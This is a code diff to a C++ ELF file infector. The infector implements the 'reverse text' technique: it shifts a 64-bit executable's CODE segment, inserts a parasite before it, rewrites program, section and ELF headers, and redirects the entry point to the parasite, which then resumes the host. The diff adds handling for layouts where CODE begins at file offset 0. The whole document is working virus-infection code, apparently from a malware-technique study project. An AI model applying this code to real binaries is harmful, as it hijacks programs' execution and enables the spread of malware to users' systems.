@@ -13,7 +13,6 @@ struct ElfReverseTextInfo {
   Elf64_Addr original_code_segment_p_vaddr;
   Elf64_Addr original_code_segment_file_offset;
   size_t code_segment_idx;
-  bool code_segment_includes_ehdr_and_phdr;
 };
 
 uint64_t round_up_to_page(uint64_t v) { return (v & ~(4096 - 1)) + 4096; }
@@ -33,13 +32,35 @@ bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr,
       cur_entry->sh_offset += padded_virus_size;
     }
     // Shift V Address
-    if (cur_entry->sh_addr && cur_entry->sh_addr < info.original_code_segment_p_vaddr) {
+    if (cur_entry->sh_addr &&
+        cur_entry->sh_addr <= info.original_code_segment_p_vaddr) {
       cur_entry->sh_addr -= padded_virus_size;
     }
   }
   return true;
 }
 
+// On some arch, the CODE segment would map from the start of the elf (aarch64)
+// which results in less LOAD entries. But some would have multiple LOAD entries
+// precedding CODE, and only map what's necessary to have execution bit (x86).
+// for example:
+//    Type Offset   VirtAddr            FileSiz           Flg
+//    LOAD 0x000000 0x0000000000400000  0x002518  R   0x1000
+//    LOAD 0x003000 0x0000000000403000  0x0573f1  RE  0x1000 <-- CODE
+//    LOAD 0x05b000 0x000000000045b000  0x0844d0  R   0x1000
+//    LOAD 0x0dfb00 0x00000000004e0b00  0x002550  RW  0x1000
+// Since we must insert virus to the begining of CODE, the virus insertion
+// offset is the original CODE start offset, and all phdr entry offsets after
+// CODE will be shifted back. All entries before and including CODE must shift
+// vaddr forward.
+//
+//    LOAD 0x000000 0x0000000000400000  0x0d2910  RE  0x10000 <-- CODE
+//    LOAD 0x0d2910 0x00000000004e2910  0x002d18  RW  0x10000
+// In this example, the CODE starts from the begining, including the ehdr and
+// phdr We need to leave elf header intact and therefore, the virus must be
+// inserted after ehdr but before the phdr, and all phdr entry offsets after
+// CODE will be shifted back.
+//
 void patch_phdr(const Elf64_Ehdr& ehdr, Elf64_Phdr& phdr,
                 uint64_t padded_virus_size, const ElfReverseTextInfo& info) {
   auto pht_entry_count = ehdr.e_phnum;
@@ -64,7 +85,7 @@ void patch_phdr(const Elf64_Ehdr& ehdr, Elf64_Phdr& phdr,
       }
     }
 
-    // Handle CODE size
+    // Handle CODE segment
     if (idx == info.code_segment_idx) {
       // extending CODE segment backwards.
       cur_entry->p_filesz += padded_virus_size;
@@ -76,18 +97,23 @@ void patch_phdr(const Elf64_Ehdr& ehdr, Elf64_Phdr& phdr,
 void patch_ehdr(Elf64_Ehdr& ehdr, const ElfReverseTextInfo& info,
                 uint64_t padded_virus_size) {
   if (ehdr.e_type == ET_EXEC) {
-      // LOAD R
-      //  ehdr
-      //  phdr
-      //  readonly sections
-      // LOAD RX
-      //  virus  <-
-      //  text section
     ehdr.e_entry = info.original_code_segment_p_vaddr - padded_virus_size;
+    // virus inserted after ehdr.
+    if (info.original_code_segment_file_offset == 0) {
+      ehdr.e_entry += sizeof(Elf64_Ehdr);
+    }
   } else {
+    printf("DYN not implemented\n");
     CHECK_FAIL();
   }
+  // section header always comes after the virus.
   ehdr.e_shoff += padded_virus_size;
+
+  if (info.original_code_segment_file_offset == 0) {
+    // This means CODE starts from offset 0 and virus is inserted after ehdr but
+    // before phdr. otherwise, virus is inserted after phdr.
+    ehdr.e_phoff += padded_virus_size;
+  }
 }
 
 bool get_info(const Elf64_Ehdr& ehdr, const Elf64_Phdr& phdr,
@@ -111,21 +137,26 @@ bool get_info(const Elf64_Ehdr& ehdr, const Elf64_Phdr& phdr,
 }
 
 size_t inject_virus(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
-                  const vt::common::Mmap<PROT_READ>& parasite_mapping,
-                  const Elf64_Ehdr& ehdr, uint64_t padded_virus_size,
-                  const ElfReverseTextInfo& info) {
+                    const vt::common::Mmap<PROT_READ>& parasite_mapping,
+                    const Elf64_Ehdr& ehdr, uint64_t padded_virus_size,
+                    const ElfReverseTextInfo& info) {
   Elf64_Addr virus_insert_offset = info.original_code_segment_file_offset;
-  
+  if (virus_insert_offset == 0) {
+    // If CODE includes ehdr, inject after it.
+    virus_insert_offset += sizeof(Elf64_Ehdr);
+  }
+  printf("inserted virus at offset 0x%x\n", virus_insert_offset);
   // Shift old content back.
   memcpy(host_mapping.mutable_base() + virus_insert_offset + padded_virus_size,
          host_mapping.mutable_base() + virus_insert_offset,
          host_mapping.size() - padded_virus_size - virus_insert_offset);
   // Clear old content. Not required.
-  memset(host_mapping.mutable_base() + virus_insert_offset, 0x00, padded_virus_size);
+  memset(host_mapping.mutable_base() + virus_insert_offset, 0x00,
+         padded_virus_size);
 
   // Inject the virus.
-  memcpy(host_mapping.mutable_base() + virus_insert_offset, parasite_mapping.base(),
-         parasite_mapping.size());
+  memcpy(host_mapping.mutable_base() + virus_insert_offset,
+         parasite_mapping.base(), parasite_mapping.size());
 
   return virus_insert_offset;
 }
@@ -136,8 +167,8 @@ bool reverse_text_infect64(
     vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
     vt::common::Mmap<PROT_READ> parasite_mapping) {
   const auto& ehdr = *reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
-  if (ehdr.e_type == ET_REL || ehdr.e_type == ET_CORE ||
-      ehdr.e_ident[EI_CLASS] == ELFCLASS32) {
+  if (ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN ||
+      ehdr.e_ident[EI_CLASS] != ELFCLASS64) {
     return false;
   }
 
@@ -157,12 +188,13 @@ bool reverse_text_infect64(
         host_mapping.mutable_base() + ehdr.e_phoff);
     patch_phdr(ehdr, mutable_phdr, padded_virus_size, info);
   }
-
+  printf("patched phdr\n");
   {
     auto& mutable_shdr = *reinterpret_cast<Elf64_Shdr*>(
         host_mapping.mutable_base() + ehdr.e_shoff);
     patch_sht(ehdr, mutable_shdr, padded_virus_size, info);
   }
+  printf("patched sht\n");
 
   {
     // Patch elf header last
@@ -170,13 +202,15 @@ bool reverse_text_infect64(
         *reinterpret_cast<Elf64_Ehdr*>(host_mapping.mutable_base());
     patch_ehdr(mutable_ehdr, info, padded_virus_size);
   }
+  printf("patched ehdr\n");
 
   // Shift host content back, starting from the beginning of CODE segment start.
   printf("host size %x extra space %x\n", host_mapping.size(),
          padded_virus_size);
 
-  auto virus_offset = inject_virus(host_mapping, parasite_mapping, ehdr, padded_virus_size, info);
- 
+  auto virus_offset = inject_virus(host_mapping, parasite_mapping, ehdr,
+                                   padded_virus_size, info);
+
   // Patch parasite to resume host code after execution.
   return patch_parasite_and_relinquish_control(
       ehdr.e_type, info.original_e_entry, ehdr.e_entry, virus_offset,
